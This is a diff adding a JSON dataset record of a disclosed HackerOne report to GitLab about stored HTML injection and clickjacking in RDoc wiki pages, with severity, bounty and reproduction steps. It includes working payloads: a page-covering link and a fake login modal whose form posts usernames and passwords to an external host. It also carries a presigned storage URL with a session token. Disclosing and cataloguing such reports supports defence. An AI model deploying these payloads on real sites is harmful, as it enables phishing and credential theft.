@@ -1,0 +1,44 @@
+{
+    "reported_to": "GitLab",
+    "reported_by": "vakzz ",
+    "title": "Cross-site Scripting (XSS) - Stored in RDoc wiki pages",
+    "content": "\nSummary\nWhen creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanitized, when creating a linkable image of the format {<img src>}[link]\nFor example it is possible to specify a class attribute when creating an image link:\nCode 128 Bytes\n1{\n2<a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'>\n3<img height=10000 width=10000></a>\n4}[a]\nwill generate the following:\nCode 235 Bytes\n1<div class=\"md md-file\">\n2  <p>Full Page link</p>\n3  <p><a href=\"a\" rel=\"nofollow\"></a><a href=\"https://aw.rs/users/signin\" class=\"atwho-view select2-drop-mask pika-select\" rel=\"nofollow\"><img height=\"10000\" width=\"10000\"></a></p>\n4</div>\nThis will place a link taking over the entire page and intercept any clicks, atwho-view select2-drop-mask pika-select are just some real classes that make the links position absolute with a high z-index.\nThe target attribute could also be set to _blank and as there is no rel=\"noopener\" reverse tabnabbing is also possible.\nAnother attack that is more likely to work would be to create a form in a modal, which could be used to ask for a username and password:\nCode 679 Bytes\n1a form\n2{\n3<div class=\"modal show d-block\">\n4<div class=\"modal-dialog\">\n5<div class=\"modal-content\">\n6<div class=\"modal-header\">\n7<h3 class=\"page-title\">Please Log In</h3>\n8</div>\n9<div class=\"modal-body\">\n10<form class=\"new-wiki-page\" action=\"http://aw.rs/\">\n11<div class=\"form-group\">\n12<label for=\"username\"><span>Username</span></label>\n13<input type=\"text\" name=\"username\" id=\"username\" class=\"form-control\">\n14<label for=\"password\"><span>Password</span></label>\n15<input type=\"password\" name=\"password\" id=\"password\" class=\"form-control\">\n16</div>\n17<div class=\"form-actions\"><button name=\"button\" type=\"submit\" class=\"btn btn-success\">Login</button></div>\n18</form>\n19</div>\n20</div>\n21</div>\n22</div>\n23}[/]\n<image_0>\nSteps to reproduce\nCreate a wiki on gitlab\nAdd a new RDoc page with the above snippet\nSave and wait for someone to click it\nImpact\nAn attacker could trick a user into thinking they had clicked on a gitlab element when they are actually redirected to the attackers site, or be presented with a dialog that will post to an attackers site.\nExamples\nExample linking to a fake sign in form:\nhttps://gitlab.com/wbowling/wiki/wikis/home\nExample creating a modal form:\nhttps://gitlab.com/wbowling/wiki/wikis/home2\nWhat is the current bug behavior?\nWhen using an image link in RDoc the anchor tag attributes are not sanitized correctly.\nWhat is the expected correct behavior?\nThey should be correctly sanitized.\nRelevant logs and/or screenshots\nOutput of checks\nThis bug happens on GitLab.com\nResults of GitLab environment info\nCode 809 Bytes\n1System information\n2System:\t\tUbuntu 16.04\n3Current User:\tgit\n4Using RVM:\tno\n5Ruby Version:\t2.6.3p62\n6Gem Version:\t2.7.9\n7Bundler Version:1.17.3\n8Rake Version:\t12.3.2\n9Redis Version:\t3.2.12\n10Git Version:\t2.21.0\n11Sidekiq Version:5.2.7\n12Go Version:\tunknown\n13\n14GitLab information\n15Version:\t12.1.1\n16Revision:\tf9abaa7d833\n17Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n18DB Adapter:\tPostgreSQL\n19DB Version:\t10.7\n20URL:\t\thttp://gitlab-vm.local\n21HTTP Clone URL:\thttp://gitlab-vm.local/some-group/some-project.git\n22SSH Clone URL:\tgit@gitlab-vm.local:some-group/some-project.git\n23Using LDAP:\tno\n24Using Omniauth:\tyes\n25Omniauth Providers:\n26\n27GitLab Shell\n28Version:\t9.3.0\n29Repository storage paths:\n30- default: \t/var/opt/gitlab/git-data/repositories\n31GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n32Git:\t\t/opt/gitlab/embedded/bin/git\nImpact\nTrick users into giving up their account details via a legitimate looking form on gitlab.com\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": 3500,
+    "weaknesses": [
+        "UI Redressing (Clickjacking)"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/541/421/763b478fdb45bfb26faec26951ad971a47e2025f/form.png?response-content-disposition=attachment%3B%20filename%3D%22form.png%22%3B%20filename%2A%3DUTF-8%27%27form.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6H5VU6N2%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T021049Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGAKFOh1FHbJaZY1RxuAGSrHEXBRmkDCGZ1Mvr6vv70SAiBit3uFFRFC8N%2FDz6SxXhFvFOwfnXfsSN2AgvhauGjpEiqxBQggEAMaDDAxMzYxOTI3NDg0OSIMg4eaX2DrHVjEuzHnKo4FlkbM7r1JjiznnwEghk6FJE4NI7YBc9yN0RGL1JEFvfc9U7vG827%2Bt0Fs6Al7%2FMfHEj8nQnLqV2l7b7Q8yvmtNWB8k%2B6JkqNPEWbGMEPbiz3QsPYoK%2BYS8RKrlNxLeZZJq6OX%2F%2FtOFSDB80ql1RsXmZjhW34yzjjulFK4%2BjDWjAJqNT9zaFM%2Fe6fF44zAB98nVb40nYTfYRKwiqqBhM2FaFd21wbLSH%2B5890poLP4NptchbsdjlmAP%2BGQgDaBuFDluSIokXptHgLyhQEWYanM2KzJJR83d5YguVnvXtdreqyvJAxESU8pavqE16RUzmNNFv8Gpkjpo6eUXvKcUIE9KFs6ZhgTUETL6uZv%2FHUzaXyZr%2B0UDjIkATMZjE4PWb5mjQOB%2B%2FQE%2Fobhz3tCJutmvbToNQq2GKsruO2aUWdqMVSaTB0%2BXJklJ22D5Ja1IIelqFLADDbgoSio%2FvFJjm4pNeZd3cyQ8IZ5wqmmN1Dsa9bBYuHL3PU9bkB7p%2BuNIryUSXN9DSAKD5VqNyIAqR9DziM0RNWA2xeH%2BrYlSp8ea89rlib5U324Q%2BwPRIrkHavRPXZVIUyda4caupKS%2FacMMfLiW1pcuakVQak5tM7UrE1QIRAsGw%2FVgS%2FAu%2BD6OoRwBbW0YpbyIsS3k0XHi2cBP8vtavQn5Zb0EZcT4MFwff2O%2F99ei4Lr9W%2FTddXwORp%2BRIenIiwxanbGAxFBDQX1oG8IuVZ1sn8XEhIME82E6XqTy1Tbd32NdknhR5J1mfoj%2BW2ppPrg1nf2JCGKaMIj5AuH4jvC7L3uJ0DQoIeOhSaILFTRDN7H%2FxL%2BPP4M7EEWNucJLinunqF3n7WmuyJ%2BkdQF%2Bl3Jg%2FGmmZjRklXpMNzZjL8GOrIBS7JFCC2tMlRSokp%2F6xDb3MimfciEEcf7wK1jFXL%2FAK2kTaXdbntCllkoflZgs3z2Lje3NRdOPPv6AIo%2BwBrgik5bwXlJc4mm4YQlor3Hj5%2Fh8tFxmnjQ3GoWjpQjLd9P0yJ%2FWSL9qNG5Eo8tthQl%2B42EesTkWV1aKatrnJR07unu0BI7nAY2sRRdBACw5AX4TWjNv6YyggBduMV5M%2FeaY9WkSXnJt1EJEoC%2FhdvgsYBzYg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3ef676f03d5a4b3677134b000ada995e6c17da0dfc08f7a5683aba11ffce4ca9"
+    },
+    "disclosed_date": 1576504920,
+    "report_url": "https://hackerone.com/reports/662287",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create a wiki on GitLab"
+        ],
+        [
+            2,
+            "Add a new RDoc page with the provided malicious HTML snippet"
+        ],
+        [
+            3,
+            "Save the page and wait for someone to click on the malicious link or form"
+        ]
+    ],
+    "vuln_description": "The vulnerability is a stored Cross-site Scripting (XSS) issue in GitLab's RDoc wiki pages, where HTML tags and attributes are not properly sanitized. This allows an attacker to inject malicious HTML, such as a link that takes over the entire page or a fake login form, which can trick users into revealing their credentials.",
+    "reason": "The attack involves understanding the RDoc wiki syntax and how it processes HTML attributes, but the actual exploitation is straightforward once the syntax is known. The vulnerability does not require complex interactions or manipulation of application states.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
